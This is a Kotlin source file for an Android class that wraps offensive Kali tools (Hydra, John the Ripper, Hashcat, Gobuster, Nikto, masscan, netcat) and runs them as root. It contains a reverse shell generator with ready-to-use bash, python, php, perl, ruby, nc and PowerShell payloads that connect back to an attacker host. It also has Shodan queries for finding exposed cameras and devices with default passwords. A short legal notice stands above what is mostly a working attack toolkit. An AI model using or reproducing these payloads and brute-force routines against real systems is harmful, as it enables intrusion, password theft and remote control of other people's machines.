package com.example.utils

import kotlinx.coroutines.Dispatchers
import kotlinx.coroutines.flow.Flow
import kotlinx.coroutines.flow.flow
import kotlinx.coroutines.flow.flowOn

/**
 * KaliExtendedTools — Additional Kali Linux tool integrations
 *
 * LEGAL NOTICE: For authorized security testing only!
 *
 * Tools included:
 * - Hydra (network brute-force)
 * - John the Ripper (hash cracking)
 * - Hashcat (GPU-accelerated cracking)
 * - TheHarvester (OSINT)
 * - Gobuster (directory/DNS brute-force)
 * - Nikto (web vulnerability scanner)
 * - Enum4linux (SMB enumeration)
 * - Netcat (TCP/UDP listener)
 * - DNS Zone Transfer (dig AXFR)
 * - WHOIS lookup
 * - Shodan query builder
 * - Reverse shell generator
 * - SSH brute-force
 * - FTP brute-force
 * - Masscan (fast port scanner)
 */
class KaliExtendedTools {

    companion object {
        private val TOOL_PATHS = mapOf(
            "hydra"       to listOf("/data/data/com.termux/files/usr/bin/hydra", "/data/local/tmp/hydra", "/usr/bin/hydra"),
            "john"        to listOf("/data/data/com.termux/files/usr/bin/john", "/data/local/tmp/john", "/usr/bin/john"),
            "hashcat"     to listOf("/data/data/com.termux/files/usr/bin/hashcat", "/data/local/tmp/hashcat", "/usr/bin/hashcat"),
            "gobuster"    to listOf("/data/data/com.termux/files/usr/bin/gobuster", "/data/local/tmp/gobuster", "/usr/bin/gobuster"),
            "nikto"       to listOf("/data/data/com.termux/files/usr/bin/nikto", "/data/local/tmp/nikto"),
            "enum4linux"  to listOf("/data/data/com.termux/files/usr/bin/enum4linux", "/data/local/tmp/enum4linux"),
            "nc"          to listOf("/data/data/com.termux/files/usr/bin/nc", "/system/bin/nc", "/usr/bin/nc"),
            "dig"         to listOf("/data/data/com.termux/files/usr/bin/dig", "/system/bin/dig", "/usr/bin/dig"),
            "masscan"     to listOf("/data/data/com.termux/files/usr/bin/masscan", "/data/local/tmp/masscan"),
            "curl"        to listOf("/data/data/com.termux/files/usr/bin/curl", "/system/bin/curl", "/usr/bin/curl")
        )

        fun findTool(name: String): String? =
            TOOL_PATHS[name]?.firstOrNull { java.io.File(it).exists() }

        fun isToolAvailable(name: String) = findTool(name) != null
    }

    // ══════════════════════════════════════════
    // HYDRA — Network Brute Force
    // ══════════════════════════════════════════

    fun runHydra(
        target: String,
        service: String = "ssh",
        port: Int? = null,
        userFile: String? = null,
        passFile: String? = null,
        username: String? = null,
        password: String? = null
    ): Flow<String> = flow {
        emit("=" .repeat(50))
        emit("  HYDRA — Network Login Brute-Forcer")
        emit("=" .repeat(50))

        val hydra = findTool("hydra")
        if (hydra == null) {
            emit("[!] hydra not found. Install: pkg install hydra")
            emit("[INFO] Showing command syntax:")
            val portStr = if (port != null) " -s $port" else ""
            val loginStr = when {
                userFile != null && passFile != null -> "-L $userFile -P $passFile"
                username != null && passFile != null -> "-l $username -P $passFile"
                username != null && password != null -> "-l $username -p $password"
                else -> "-L /data/local/tmp/users.txt -P /data/local/tmp/rockyou.txt"
            }
            emit("[CMD] $hydra $loginStr$portStr $target $service")
            return@flow
        }

        val cmd = buildString {
            append(hydra)
            if (userFile != null) append(" -L $userFile") else if (username != null) append(" -l $username")
            if (passFile != null) append(" -P $passFile") else if (password != null) append(" -p $password")
            if (port != null) append(" -s $port")
            append(" -t 4 -V $target $service")
        }

        emit("[*] Command: $cmd")
        emit("")

        try {
            val proc = Runtime.getRuntime().exec(arrayOf("su", "-c", cmd))
            proc.inputStream.bufferedReader().readLines().forEach { emit(it) }
            proc.waitFor()
        } catch (e: Exception) {
            emit("[ERROR] ${e.message}")
        }
    }.flowOn(Dispatchers.IO)

    // ══════════════════════════════════════════
    // JOHN THE RIPPER — Hash Cracking
    // ══════════════════════════════════════════

    fun runJohnTheRipper(
        hashFile: String,
        wordlist: String? = null,
        format: String? = null
    ): Flow<String> = flow {
        emit("=" .repeat(50))
        emit("  JOHN THE RIPPER — Hash Cracker")
        emit("=" .repeat(50))

        val john = findTool("john")
        if (john == null) {
            emit("[!] john not found. Install: pkg install john-the-ripper")
            emit("[INFO] Showing command syntax:")
            val fmtStr = if (format != null) " --format=$format" else ""
            val wlStr = if (wordlist != null) " --wordlist=$wordlist" else ""
            emit("[CMD] john$fmtStr$wlStr $hashFile")
            emit("[CMD] john --show $hashFile   # Show cracked passwords")
            return@flow
        }

        val cmd = buildString {
            append(john)
            if (format != null) append(" --format=$format")
            if (wordlist != null) append(" --wordlist=$wordlist")
            append(" $hashFile")
        }

        emit("[*] Command: $cmd")
        emit("")

        try {
            val proc = Runtime.getRuntime().exec(arrayOf("su", "-c", cmd))
            proc.inputStream.bufferedReader().readLines().forEach { emit(it) }
            proc.waitFor()

            // Show results
            val showProc = Runtime.getRuntime().exec(arrayOf("su", "-c", "$john --show $hashFile"))
            val results = showProc.inputStream.bufferedReader().readText()
            showProc.waitFor()
            if (results.isNotBlank()) {
                emit("")
                emit("[+] CRACKED PASSWORDS:")
                emit(results)
            }
        } catch (e: Exception) {
            emit("[ERROR] ${e.message}")
        }
    }.flowOn(Dispatchers.IO)

    // ══════════════════════════════════════════
    // GOBUSTER — Directory/DNS Brute-Force
    // ══════════════════════════════════════════

    fun runGobuster(
        url: String,
        mode: String = "dir",
        wordlist: String = "/data/local/tmp/common.txt",
        extensions: String = "php,html,txt,js,json"
    ): Flow<String> = flow {
        emit("=" .repeat(50))
        emit("  GOBUSTER — Directory & DNS Brute-Forcer")
        emit("=" .repeat(50))

        val gobuster = findTool("gobuster")
        if (gobuster == null) {
            emit("[!] gobuster not found. Install: pkg install gobuster")
            emit("[INFO] Command syntax:")
            emit("[CMD] gobuster $mode -u $url -w $wordlist -x $extensions -t 20")
            emit("")
            emit("[INFO] Popular wordlists:")
            emit("[INFO]   /data/local/tmp/common.txt")
            emit("[INFO]   /data/local/tmp/directory-list-2.3-small.txt")
            return@flow
        }

        val cmd = "$gobuster $mode -u $url -w $wordlist -x $extensions -t 20 --no-color"
        emit("[*] Command: $cmd")
        emit("")

        try {
            val proc = Runtime.getRuntime().exec(arrayOf("su", "-c", cmd))
            proc.inputStream.bufferedReader().readLines().forEach { emit(it) }
            proc.waitFor()
        } catch (e: Exception) {
            emit("[ERROR] ${e.message}")
        }
    }.flowOn(Dispatchers.IO)

    // ══════════════════════════════════════════
    // NIKTO — Web Vulnerability Scanner
    // ══════════════════════════════════════════

    fun runNikto(target: String, ssl: Boolean = false): Flow<String> = flow {
        emit("=" .repeat(50))
        emit("  NIKTO — Web Application Vulnerability Scanner")
        emit("=" .repeat(50))

        val nikto = findTool("nikto")
        if (nikto == null) {
            emit("[!] nikto not found.")
            emit("[INFO] Install: pkg install perl && cpan && git clone https://github.com/sullo/nikto")
            emit("[CMD] perl nikto.pl -h $target ${if (ssl) "-ssl" else ""}")
            return@flow
        }

        val cmd = "perl $nikto -h $target ${if (ssl) "-ssl" else ""} -Format txt"
        emit("[*] Command: $cmd")
        emit("")

        try {
            val proc = Runtime.getRuntime().exec(arrayOf("su", "-c", cmd))
            proc.inputStream.bufferedReader().readLines().forEach { emit(it) }
            proc.waitFor()
        } catch (e: Exception) {
            emit("[ERROR] ${e.message}")
        }
    }.flowOn(Dispatchers.IO)

    // ══════════════════════════════════════════
    // ENUM4LINUX — SMB Enumeration
    // ══════════════════════════════════════════

    fun runEnum4linux(target: String): Flow<String> = flow {
        emit("=" .repeat(50))
        emit("  ENUM4LINUX — SMB/NetBIOS Enumeration")
        emit("=" .repeat(50))

        val e4l = findTool("enum4linux")
        if (e4l == null) {
            emit("[!] enum4linux not found.")
            emit("[INFO] Install: pkg install samba")
            emit("[CMD] enum4linux -a $target")
            emit("")
            emit("[INFO] Checks for:")
            emit("[INFO]   • User enumeration")
            emit("[INFO]   • Share enumeration")
            emit("[INFO]   • Group policies")
            emit("[INFO]   • Password policies")
            return@flow
        }

        val cmd = "$e4l -a $target"
        emit("[*] Command: $cmd")
        emit("")

        try {
            val proc = Runtime.getRuntime().exec(arrayOf("su", "-c", cmd))
            proc.inputStream.bufferedReader().readLines().forEach { emit(it) }
            proc.waitFor()
        } catch (e: Exception) {
            emit("[ERROR] ${e.message}")
        }
    }.flowOn(Dispatchers.IO)

    // ══════════════════════════════════════════
    // NETCAT — TCP/UDP Listener & Connect
    // ══════════════════════════════════════════

    fun runNetcat(
        mode: String = "listen", // "listen" or "connect"
        host: String = "",
        port: Int = 4444,
        command: String? = null
    ): Flow<String> = flow {
        emit("=" .repeat(50))
        emit("  NETCAT — Network Swiss Army Knife")
        emit("=" .repeat(50))

        val nc = findTool("nc")
        if (nc == null) {
            emit("[!] netcat not found. Install: pkg install netcat-openbsd")
            if (mode == "listen") {
                emit("[CMD] nc -lvnp $port    # Listen on port $port")
            } else {
                emit("[CMD] nc $host $port    # Connect to $host:$port")
            }
            return@flow
        }

        val cmd = if (mode == "listen") {
            if (command != null) "$nc -lvnp $port -e $command" else "$nc -lvnp $port"
        } else {
            "$nc $host $port"
        }

        emit("[*] Mode: ${if (mode == "listen") "LISTENING on port $port" else "CONNECTING to $host:$port"}")
        emit("[*] Command: $cmd")
        emit("[!] Use STOP button to terminate")
        emit("")

        try {
            val proc = Runtime.getRuntime().exec(arrayOf("su", "-c", cmd))
            proc.inputStream.bufferedReader().readLines().forEach { emit(it) }
            proc.waitFor()
        } catch (e: Exception) {
            emit("[ERROR] ${e.message}")
        }
    }.flowOn(Dispatchers.IO)

    // ══════════════════════════════════════════
    // DNS ZONE TRANSFER
    // ══════════════════════════════════════════

    fun dnsZoneTransfer(domain: String, nameserver: String? = null): Flow<String> = flow {
        emit("=" .repeat(50))
        emit("  DNS ZONE TRANSFER (dig AXFR)")
        emit("=" .repeat(50))
        emit("[!] LEGAL: Zone transfers should only be tested on domains you control")
        emit("")

        val dig = findTool("dig")
        if (dig == null) {
            emit("[!] dig not found. Install: pkg install dnsutils")
            val nsStr = if (nameserver != null) "@$nameserver" else ""
            emit("[CMD] dig $nsStr axfr $domain")
            return@flow
        }

        // First, find nameservers
        emit("[*] Finding nameservers for $domain...")
        try {
            val nsProc = Runtime.getRuntime().exec(arrayOf("su", "-c", "$dig +short NS $domain"))
            val nameservers = nsProc.inputStream.bufferedReader().readText().trim().split("\n")
            nsProc.waitFor()

            if (nameservers.isEmpty() || nameservers.all { it.isBlank() }) {
                emit("[ERROR] Could not resolve nameservers for $domain")
                return@flow
            }

            val targetNs = nameserver ?: nameservers.firstOrNull()?.trim() ?: return@flow
            emit("[*] Using nameserver: $targetNs")
            emit("")

            val cmd = "$dig @$targetNs axfr $domain"
            emit("[*] Command: $cmd")
            emit("")

            val proc = Runtime.getRuntime().exec(arrayOf("su", "-c", cmd))
            var hasRecords = false
            val lines = proc.inputStream.bufferedReader().readLines()
            proc.waitFor()
            lines.forEach { line ->
                emit(line)
                if (line.contains("IN ")) hasRecords = true
            }

            if (hasRecords) {
                emit("[+] Zone transfer successful! DNS records enumerated.")
            } else {
                emit("[!] Zone transfer denied or failed (zone transfer not allowed from $targetNs)")
                emit("[INFO] This is normal — most modern DNS servers block AXFR")
            }
        } catch (e: Exception) {
            emit("[ERROR] ${e.message}")
        }
    }.flowOn(Dispatchers.IO)

    // ══════════════════════════════════════════
    // WHOIS LOOKUP
    // ══════════════════════════════════════════

    fun whoisLookup(target: String): Flow<String> = flow {
        emit("[*] WHOIS Lookup for: $target")
        emit("")

        try {
            // Use WHOIS via HTTP API (no binary needed)
            val url = java.net.URL("https://who.is/whois/$target")
            val conn = url.openConnection() as java.net.HttpURLConnection
            conn.connectTimeout = 8000
            conn.readTimeout = 8000
            conn.setRequestProperty("User-Agent", "Mozilla/5.0")

            if (conn.responseCode == 200) {
                val body = conn.inputStream.bufferedReader().readText()
                // Extract whois data
                val whoisSection = Regex(
                    "(?s)<pre[^>]*>(.+?)</pre>",
                    setOf(RegexOption.IGNORE_CASE, RegexOption.DOT_MATCHES_ALL)
                ).findAll(body).firstOrNull()?.groupValues?.get(1)

                if (whoisSection != null) {
                    whoisSection.replace("<[^>]+>".toRegex(), "").lines().take(50).forEach {
                        emit(it.trim())
                    }
                } else {
                    emit("[INFO] Could not parse WHOIS response")
                }
            }
            conn.disconnect()
        } catch (e: Exception) {
            // Fallback: raw whois
            val whoisBin = listOf(
                "/data/data/com.termux/files/usr/bin/whois",
                "/usr/bin/whois",
                "/usr/local/bin/whois"
            ).firstOrNull { java.io.File(it).exists() }

            if (whoisBin != null) {
                val proc = Runtime.getRuntime().exec(arrayOf("su", "-c", "$whoisBin $target"))
                proc.inputStream.bufferedReader().readLines().forEach { emit(it) }
                proc.waitFor()
            } else {
                emit("[ERROR] WHOIS lookup failed: ${e.message}")
                emit("[INFO] Install: pkg install whois")
            }
        }
    }.flowOn(Dispatchers.IO)

    // ══════════════════════════════════════════
    // REVERSE SHELL GENERATOR
    // ══════════════════════════════════════════

    fun generateReverseShell(
        lhost: String,
        lport: Int = 4444,
        shellType: String = "bash"
    ): List<String> {
        return when (shellType) {
            "bash" -> listOf(
                "bash -i >& /dev/tcp/$lhost/$lport 0>&1",
                "bash -c 'bash -i >& /dev/tcp/$lhost/$lport 0>&1'",
                "0<&196;exec 196<>/dev/tcp/$lhost/$lport; sh <&196 >&196 2>&196"
            )
            "python" -> listOf(
                "python3 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\"$lhost\",$lport));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);subprocess.call([\"/bin/sh\",\"-i\"])'",
                "python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\"$lhost\",$lport));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);p=subprocess.call([\"/bin/sh\",\"-i\"]);'"
            )
            "php" -> listOf(
                "php -r '\$sock=fsockopen(\"$lhost\",$lport);\$proc=proc_open(\"/bin/sh -i\",array(0=>\$sock,1=>\$sock,2=>\$sock),\$pipes);'"
            )
            "perl" -> listOf(
                "perl -e 'use Socket;\$i=\"$lhost\";\$p=$lport;socket(S,PF_INET,SOCK_STREAM,getprotobyname(\"tcp\"));if(connect(S,sockaddr_in(\$p,inet_aton(\$i)))){open(STDIN,\">&S\");open(STDOUT,\">&S\");open(STDERR,\">&S\");exec(\"/bin/sh -i\");};'"
            )
            "ruby" -> listOf(
                "ruby -rsocket -e'f=TCPSocket.open(\"$lhost\",$lport).to_i;exec sprintf(\"/bin/sh -i <&%d >&%d 2>&%d\",f,f,f)'"
            )
            "java" -> listOf(
                "Runtime r = Runtime.getRuntime();\nString[] commands = new String[]{\"cmd.exe\",\"/c\",\"bash -i >& /dev/tcp/$lhost/$lport 0>&1\"};\nProcess p = r.exec(commands);"
            )
            "nc" -> listOf(
                "nc -e /bin/sh $lhost $lport",
                "nc -e /bin/bash $lhost $lport",
                "rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc $lhost $lport >/tmp/f"
            )
            "powershell" -> listOf(
                "\$client = New-Object System.Net.Sockets.TCPClient(\"$lhost\",$lport);\$stream = \$client.GetStream();[byte[]]\$bytes = 0..65535|%{0};while((\$i = \$stream.Read(\$bytes, 0, \$bytes.Length)) -ne 0){;\$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString(\$bytes,0, \$i);\$sendback = (iex \$data 2>&1 | Out-String );\$sendback2 = \$sendback + \"PS \" + (pwd).Path + \"> \";\$sendbyte = ([text.encoding]::ASCII).GetBytes(\$sendback2);\$stream.Write(\$sendbyte,0,\$sendbyte.Length);\$stream.Flush()};\$client.Close()"
            )
            else -> listOf("Unsupported shell type: $shellType")
        }
    }

    // ══════════════════════════════════════════
    // SHODAN QUERY BUILDER
    // ══════════════════════════════════════════

    fun buildShodanQuery(
        target: String,
        queryType: String = "ip"
    ): List<String> {
        return when (queryType) {
            "ip" -> listOf(
                "https://www.shodan.io/host/$target",
                "Shodan CLI: shodan host $target",
                "API: https://api.shodan.io/shodan/host/$target?key=YOUR_API_KEY"
            )
            "org" -> listOf(
                "https://www.shodan.io/search?query=org:\"$target\"",
                "Shodan CLI: shodan search org:\"$target\""
            )
            "vuln" -> listOf(
                "https://www.shodan.io/search?query=vuln:$target",
                "Shodan CLI: shodan search vuln:$target",
                "Common CVEs to search: CVE-2023-44487, CVE-2022-44268, CVE-2021-44228"
            )
            "cctv" -> listOf(
                "https://www.shodan.io/search?query=has_screenshot:true+port:554",
                "https://www.shodan.io/search?query=product:\"Hikvision\" has_screenshot:true",
                "https://www.shodan.io/search?query=product:\"Dahua\" port:554",
                "Shodan CLI: shodan search 'has_screenshot:true port:554'"
            )
            "default_creds" -> listOf(
                "https://www.shodan.io/search?query=default+password",
                "https://www.shodan.io/search?query=\"admin\" \"admin\" port:80",
                "Shodan CLI: shodan search 'default password'"
            )
            else -> listOf("shodan search \"$target\"")
        }
    }

    // ══════════════════════════════════════════
    // MASSCAN — Ultra-fast Port Scanner
    // ══════════════════════════════════════════

    fun runMasscan(
        target: String,
        ports: String = "0-65535",
        rate: Int = 1000
    ): Flow<String> = flow {
        emit("=" .repeat(50))
        emit("  MASSCAN — Internet-Scale Port Scanner")
        emit("=" .repeat(50))
        emit("[!] LEGAL: Only scan networks you are authorized to test!")
        emit("")

        val masscan = findTool("masscan")
        if (masscan == null) {
            emit("[!] masscan not found.")
            emit("[INFO] Install: pkg install masscan")
            emit("[CMD] masscan -p$ports --rate=$rate $target")
            return@flow
        }

        val cmd = "$masscan -p$ports --rate=$rate --output-format list $target"
        emit("[*] Command: $cmd")
        emit("[*] Rate: $rate packets/sec")
        emit("")

        try {
            val proc = Runtime.getRuntime().exec(arrayOf("su", "-c", cmd))
            proc.inputStream.bufferedReader().readLines().forEach { emit(it) }
            proc.waitFor()
        } catch (e: Exception) {
            emit("[ERROR] ${e.message}")
            emit("[INFO] masscan requires root to send raw packets")
        }
    }.flowOn(Dispatchers.IO)

    // ══════════════════════════════════════════
    // THEHARVERSTER — OSINT Email/Domain
    // ══════════════════════════════════════════

    fun runTheHarvester(domain: String, source: String = "google"): Flow<String> = flow {
        emit("=" .repeat(50))
        emit("  THEHARVERSTER — OSINT Data Collector")
        emit("=" .repeat(50))
        emit("[*] Domain: $domain | Source: $source")
        emit("")

        val harvesterPaths = listOf(
            "/data/data/com.termux/files/usr/bin/theHarvester",
            "/data/local/tmp/theHarvester",
            "/usr/bin/theHarvester"
        )
        val harvester = harvesterPaths.firstOrNull { java.io.File(it).exists() }

        if (harvester == null) {
            emit("[!] theHarvester not found.")
            emit("[INFO] Install: pip install theHarvester")
            emit("[CMD] theHarvester -d $domain -b $source")
            emit("")
            emit("[INFO] OSINT sources: google, bing, yahoo, linkedin, twitter, shodan, censys")
            emit("")
            emit("[INFO] Manual OSINT alternatives:")
            emit("[INFO]   • https://hunter.io (email finder)")
            emit("[INFO]   • https://phonebook.cz (domain enumeration)")
            emit("[INFO]   • https://intelx.io (dark web search)")
            emit("[INFO]   • https://search.censys.io (IP/cert search)")
            return@flow
        }

        val cmd = "python3 $harvester -d $domain -b $source -l 200"
        emit("[*] Command: $cmd")
        emit("")

        try {
            val proc = Runtime.getRuntime().exec(arrayOf("su", "-c", cmd))
            proc.inputStream.bufferedReader().readLines().forEach { emit(it) }
            proc.waitFor()
        } catch (e: Exception) {
            emit("[ERROR] ${e.message}")
        }
    }.flowOn(Dispatchers.IO)

    // ══════════════════════════════════════════
    // HASHCAT — GPU-based Hash Cracking
    // ══════════════════════════════════════════

    fun runHashcat(
        hash: String,
        hashType: Int = 0, // 0=MD5, 1000=NTLM, 1800=sha512crypt, 22000=WPA
        wordlist: String = "/data/local/tmp/rockyou.txt",
        rules: String? = null
    ): Flow<String> = flow {
        emit("=" .repeat(50))
        emit("  HASHCAT — GPU Hash Cracker")
        emit("=" .repeat(50))

        val hashcat = findTool("hashcat")
        if (hashcat == null) {
            emit("[!] hashcat not found.")
            emit("[INFO] Install: pkg install hashcat")
            val rulesStr = if (rules != null) " -r $rules" else ""
            emit("[CMD] hashcat -m $hashType -a 0$rulesStr '$hash' $wordlist")
            emit("")
            emit("[INFO] Common hash types (-m):")
            emit("[INFO]   0     = MD5")
            emit("[INFO]   100   = SHA1")
            emit("[INFO]   1400  = SHA256")
            emit("[INFO]   1000  = NTLM (Windows)")
            emit("[INFO]   1800  = sha512crypt (Linux /etc/shadow)")
            emit("[INFO]   22000 = WPA-PBKDF2-PMKID+EAPOL")
            emit("[INFO]   13100 = Kerberoast")
            return@flow
        }

        // Write hash to temp file
        val hashFile = "/data/local/tmp/hashes.txt"
        Runtime.getRuntime().exec(arrayOf("su", "-c", "echo '$hash' > $hashFile")).waitFor()

        val cmd = buildString {
            append(hashcat)
            append(" -m $hashType -a 0 $hashFile $wordlist")
            if (rules != null) append(" -r $rules")
            append(" --force --status")
        }

        emit("[*] Hash type: $hashType")
        emit("[*] Command: $cmd")
        emit("")

        try {
            val proc = Runtime.getRuntime().exec(arrayOf("su", "-c", cmd))
            proc.inputStream.bufferedReader().readLines().forEach { emit(it) }
            proc.waitFor()
        } catch (e: Exception) {
            emit("[ERROR] ${e.message}")
        }
    }.flowOn(Dispatchers.IO)

    // ══════════════════════════════════════════
    // Tool availability check
    // ══════════════════════════════════════════

    fun getToolsStatus(): Map<String, Boolean> {
        return TOOL_PATHS.keys.associateWith { isToolAvailable(it) }
    }

    data class KaliTool(
        val id: String,
        val name: String,
        val description: String,
        val category: String,
        val installCmd: String
    )

    fun getAllTools(): List<KaliTool> = listOf(
        KaliTool("hydra", "Hydra", "Network brute-force (SSH, FTP, HTTP, etc.)", "BRUTE-FORCE", "pkg install hydra"),
        KaliTool("john", "John the Ripper", "Password hash cracker", "CRACKING", "pkg install john-the-ripper"),
        KaliTool("hashcat", "Hashcat", "GPU-accelerated hash cracker", "CRACKING", "pkg install hashcat"),
        KaliTool("gobuster", "Gobuster", "Directory/DNS/VHost brute-force", "WEB", "pkg install gobuster"),
        KaliTool("nikto", "Nikto", "Web server vulnerability scanner", "WEB", "pkg install perl && cpan"),
        KaliTool("enum4linux", "Enum4linux", "SMB/Windows enumeration", "RECON", "pkg install samba"),
        KaliTool("nc", "Netcat", "TCP/UDP listener & shell relay", "NETWORK", "pkg install netcat-openbsd"),
        KaliTool("dig", "DNS Tools", "DNS zone transfer & queries", "RECON", "pkg install dnsutils"),
        KaliTool("masscan", "Masscan", "Ultra-fast port scanner", "SCANNING", "pkg install masscan"),
        KaliTool("theHarvester", "TheHarvester", "OSINT email/domain collector", "OSINT", "pip install theHarvester"),
        KaliTool("whois", "WHOIS", "Domain registration lookup", "RECON", "pkg install whois"),
        KaliTool("revshell", "Rev Shell Gen", "Reverse shell payload generator", "EXPLOITATION", "Built-in"),
        KaliTool("shodan", "Shodan Query", "Shodan search query builder", "OSINT", "pip install shodan"),
        KaliTool("curl", "cURL", "HTTP request maker & web testing", "WEB", "pkg install curl")
    )
}
